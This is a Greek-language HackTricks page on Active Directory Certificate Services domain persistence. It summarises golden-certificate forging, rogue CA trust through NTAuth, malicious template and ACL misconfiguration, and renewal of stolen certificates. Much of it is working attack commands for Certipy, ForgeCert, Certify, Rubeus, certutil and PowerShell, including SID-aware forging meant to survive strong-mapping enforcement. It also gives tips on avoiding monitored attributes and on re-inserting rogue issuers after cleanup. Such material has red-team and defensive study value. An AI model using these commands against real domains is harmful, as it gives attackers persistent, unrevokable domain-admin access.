# Επίμονη παρουσία στο Domain με AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια σύνοψη των τεχνικών διατήρησης στο domain που αναφέρονται στο [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Ελέγξτε το για περισσότερες λεπτομέρειες.

## Δημιουργία πλαστών πιστοποιητικών με κλεμμένα CA Certificates (Golden Certificate) - DPERSIST1

Πώς μπορείτε να καταλάβετε ότι ένα πιστοποιητικό είναι CA certificate;

Μπορεί να προσδιοριστεί ότι ένα πιστοποιητικό είναι CA certificate αν πληρούνται διάφορες προϋποθέσεις:

- Το πιστοποιητικό αποθηκεύεται στον CA server, με το ιδιωτικό του κλειδί να προστατεύεται από το DPAPI της μηχανής, ή από hardware όπως TPM/HSM εάν το λειτουργικό σύστημα το υποστηρίζει.
- Τα πεδία Issuer και Subject του πιστοποιητικού ταιριάζουν με το distinguished name της CA.
- Μια επέκταση "CA Version" υπάρχει αποκλειστικά στα CA certificates.
- Το πιστοποιητικό δεν έχει πεδία Extended Key Usage (EKU).

Για την εξαγωγή του ιδιωτικού κλειδιού αυτού του πιστοποιητικού, το εργαλείο certsrv.msc στον CA server είναι η υποστηριζόμενη μέθοδος μέσω του ενσωματωμένου GUI. Παρ' όλα αυτά, αυτό το πιστοποιητικό δεν διαφέρει από άλλα που είναι αποθηκευμένα στο σύστημα· επομένως, μέθοδοι όπως η [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) μπορούν να εφαρμοστούν για την εξαγωγή.

Το πιστοποιητικό και το ιδιωτικό κλειδί μπορούν επίσης να αποκτηθούν χρησιμοποιώντας το Certipy με την ακόλουθη εντολή:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Μετά την απόκτηση του πιστοποιητικού CA και του ιδιωτικού του κλειδιού σε μορφή `.pfx`, εργαλεία όπως το [ForgeCert](https://github.com/GhostPack/ForgeCert) μπορούν να χρησιμοποιηθούν για να δημιουργήσουν έγκυρα πιστοποιητικά:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Ο χρήστης που στοχεύεται για certificate forgery πρέπει να είναι ενεργός και ικανός να αυθεντικοποιηθεί σε Active Directory για να πετύχει η διαδικασία. Το forging ενός πιστοποιητικού για ειδικούς λογαριασμούς όπως ο krbtgt είναι αναποτελεσματικό.

Αυτό το forged certificate θα είναι **έγκυρο** μέχρι την καθορισμένη ημερομηνία λήξης και όσο το root CA certificate είναι **έγκυρο** (συνήθως από 5 έως **10+ χρόνια**). Είναι επίσης έγκυρο για **μηχανές**, οπότε σε συνδυασμό με **S4U2Self**, ένας επιτιθέμενος μπορεί να **maintain persistence on any domain machine** για όσο διαρκεί το CA certificate.\
Επιπλέον, τα **certificates generated** με αυτή τη μέθοδο **δεν μπορούν να ανακληθούν** καθώς το CA δεν είναι ενήμερο για αυτά.

### Λειτουργία υπό Strong Certificate Mapping Enforcement (2025+)

Από τις 11 Φεβρουαρίου 2025 (μετά την κυκλοφορία του KB5014754), οι domain controllers έχουν ως προεπιλογή το **Full Enforcement** για certificate mappings. Στην πράξη αυτό σημαίνει ότι τα forged certificates σας πρέπει είτε:

- Να περιέχουν έναν ισχυρό σύνδεσμο με τον λογαριασμό-στόχο (για παράδειγμα, την SID security extension), ή
- Να συνοδεύονται από μία ισχυρή, ρητή αντιστοίχιση στην ιδιότητα `altSecurityIdentities` του αντικειμένου-στόχου.

Μια αξιόπιστη προσέγγιση για persistence είναι να mint ένα forged certificate που είναι chained στην κλεμμένη Enterprise CA και στη συνέχεια να προσθέσετε μια strong explicit mapping στο victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Αν μπορείτε να κατασκευάσετε forged certificates που περιλαμβάνουν την επέκταση ασφάλειας SID, αυτά θα αντιστοιχιστούν έμμεσα ακόμη και υπό Full-Enforcement. Διαφορετικά, προτιμήστε explicit strong mappings. See [account-persistence](account-persistence.md) for more on explicit mappings.
- Η ανάκληση δεν βοηθά τους αμυνόμενους εδώ: forged certificates είναι άγνωστα στη βάση δεδομένων CA και ως εκ τούτου δεν μπορούν να ανακληθούν.

#### Full-Enforcement συμβατό forging (SID-aware)

Ενημερωμένα εργαλεία σας επιτρέπουν να ενσωματώσετε το SID απευθείας, διατηρώντας τα golden certificates χρησιμοποιήσιμα ακόμη και όταν οι DCs απορρίπτουν weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Ενσωματώνοντας το SID αποφεύγετε την ανάγκη να πειράξετε το `altSecurityIdentities`, το οποίο μπορεί να παρακολουθείται, ενώ ταυτόχρονα ικανοποιούνται οι αυστηροί έλεγχοι αντιστοίχισης.

## Trusting Rogue CA Certificates - DPERSIST2

Το αντικείμενο `NTAuthCertificates` ορίζεται να περιέχει ένα ή περισσότερα **CA certificates** μέσα στο attribute `cacertificate`, το οποίο χρησιμοποιεί το Active Directory (AD). Η διαδικασία επαλήθευσης από τον **domain controller** περιλαμβάνει τον έλεγχο του αντικειμένου `NTAuthCertificates` για μια εγγραφή που ταιριάζει με την **CA specified** στο πεδίο Issuer του πιστοποιητικού που κάνει authentication. Η authentication προχωρά αν βρεθεί ταύτιση.

Ένα self-signed CA certificate μπορεί να προστεθεί στο αντικείμενο `NTAuthCertificates` από έναν attacker, εφόσον έχουν έλεγχο πάνω σε αυτό το AD αντικείμενο. Κανονικά, μόνο τα μέλη της ομάδας **Enterprise Admin**, μαζί με **Domain Admins** ή **Administrators** στο **forest root’s domain**, έχουν δικαίωμα να τροποποιήσουν αυτό το αντικείμενο. Μπορούν να επεξεργαστούν το αντικείμενο `NTAuthCertificates` χρησιμοποιώντας `certutil.exe` με την εντολή `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ή με τη χρήση του [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Αυτή η δυνατότητα είναι ιδιαίτερα σχετική όταν χρησιμοποιείται σε συνδυασμό με την προαναφερθείσα μέθοδο που περιλαμβάνει το ForgeCert για τη δυναμική δημιουργία πιστοποιητικών.

> Σκέψεις για την αντιστοίχιση μετά το 2025: τοποθετώντας μια rogue CA στο NTAuth εγκαθιστάται μόνο εμπιστοσύνη στην εκδούσα CA. Για να χρησιμοποιηθούν leaf certificates για logon όταν οι DCs είναι σε **Full Enforcement**, το leaf πρέπει είτε να περιέχει την επέκταση ασφάλειας SID είτε να υπάρχει ισχυρή ρητή αντιστοίχιση στο αντικείμενο-στόχο (για παράδειγμα, Issuer+Serial στο `altSecurityIdentities`). Βλέπε {{#ref}}account-persistence.md{{#endref}}.

## Κακόβουλη Κακοδιαμόρφωση - DPERSIST3

Οι ευκαιρίες για **persistence** μέσω **security descriptor modifications of AD CS** components είναι πολλές. Οι τροποποιήσεις που περιγράφονται στην ενότητα "[Domain Escalation](domain-escalation.md)" μπορούν να υλοποιηθούν κακόβουλα από έναν attacker με αυξημένη πρόσβαση. Αυτό περιλαμβάνει την προσθήκη "control rights" (π.χ., WriteOwner/WriteDACL/etc.) σε ευαίσθητα στοιχεία όπως:

- Το αντικείμενο **CA server’s AD computer**
- Ο **CA server’s RPC/DCOM server**
- Οποιοδήποτε **descendant AD object or container** σε **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (για παράδειγμα, το Certificate Templates container, Certification Authorities container, το NTAuthCertificates object, κ.λπ.)
- **AD groups delegated rights to control AD CS** από προεπιλογή ή από τον οργανισμό (όπως η ενσωματωμένη Cert Publishers group και οποιοδήποτε από τα μέλη της)

Ένα παράδειγμα κακόβουλης υλοποίησης θα περιλάμβανε έναν attacker, ο οποίος έχει **elevated permissions** στο domain, να προσθέτει την άδεια **`WriteOwner`** στο προεπιλεγμένο πρότυπο πιστοποιητικού **`User`**, με τον attacker να είναι ο principal για το δικαίωμα. Για να το εκμεταλλευτεί, ο attacker θα άλλαζε πρώτα την ιδιοκτησία του προτύπου **`User`** στον εαυτό του. Στη συνέχεια, η σημαία **`mspki-certificate-name-flag`** θα οριζόταν σε **1** στο πρότυπο για να ενεργοποιηθεί το **`ENROLLEE_SUPPLIES_SUBJECT`**, επιτρέποντας σε έναν χρήστη να παρέχει ένα Subject Alternative Name στο αίτημα. Κατόπιν, ο attacker θα μπορούσε να **enroll** χρησιμοποιώντας το **template**, επιλέγοντας ένα όνομα **domain administrator** ως alternative name, και να χρησιμοποιήσει το αποκτηθέν πιστοποιητικό για authentication ως DA.

Πρακτικές παράμετροι που οι attackers μπορεί να ορίσουν για μακροχρόνια domain persistence (βλέπε {{#ref}}domain-escalation.md{{#endref}} για πλήρεις λεπτομέρειες και ανίχνευση):

- CA policy flags που επιτρέπουν SAN από requesters (π.χ., ενεργοποίηση `EDITF_ATTRIBUTESUBJECTALTNAME2`). Αυτό διατηρεί τις διαδρομές τύπου ESC1 εκμεταλλεύσιμες.
- Template DACL ή ρυθμίσεις που επιτρέπουν issuance με δυνατότητα authentication (π.χ., προσθήκη Client Authentication EKU, ενεργοποίηση `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Έλεγχος του `NTAuthCertificates` object ή των CA containers για συνεχή επανεισδοχή rogue issuers εάν οι defenders επιχειρήσουν cleanup.

> [!TIP]
> Σε hardened περιβάλλοντα μετά το KB5014754, ο συνδυασμός αυτών των κακοδιαμορφώσεων με ρητές ισχυρές αντιστοιχίσεις (`altSecurityIdentities`) εξασφαλίζει ότι τα εκδιδόμενα ή πλαστά πιστοποιητικά παραμένουν χρησιμοποιήσιμα ακόμα και όταν οι DCs επιβάλλουν strong mapping.

### Κατάχρηση ανανέωσης πιστοποιητικών (ESC14) για persistence

Εάν comprometετέ ένα authentication-capable certificate (ή ένα Enrollment Agent), μπορείτε να το **renew it indefinitely** εφόσον το εκδιδόμενο template παραμένει δημοσιευμένο και η CA εξακολουθεί να εμπιστεύεται την αλυσίδα εκδότη. Η ανανέωση διατηρεί τους αρχικούς δεσμούς ταυτότητας αλλά επεκτείνει τη διάρκεια ισχύος, καθιστώντας τον εξαναγκασμό εκκένωσης δύσκολο εκτός αν το template διορθωθεί ή η CA επαναδημοσιευθεί.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Εάν οι domain controllers είναι σε **Full Enforcement**, προσθέστε `-sid <victim SID>` (ή χρησιμοποιήστε ένα template που εξακολουθεί να περιλαμβάνει την SID security extension) ώστε το ανανεωμένο leaf certificate να συνεχίσει να αντιστοιχίζεται ισχυρά χωρίς να πειράζετε το `altSecurityIdentities`. Οι επιτιθέμενοι με δικαιώματα CA admin μπορούν επίσης να τροποποιήσουν το `policy\RenewalValidityPeriodUnits` για να επιμηκύνουν τις ανανεωμένες διάρκειες ζωής πριν εκδώσουν οι ίδιοι ένα cert.


## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
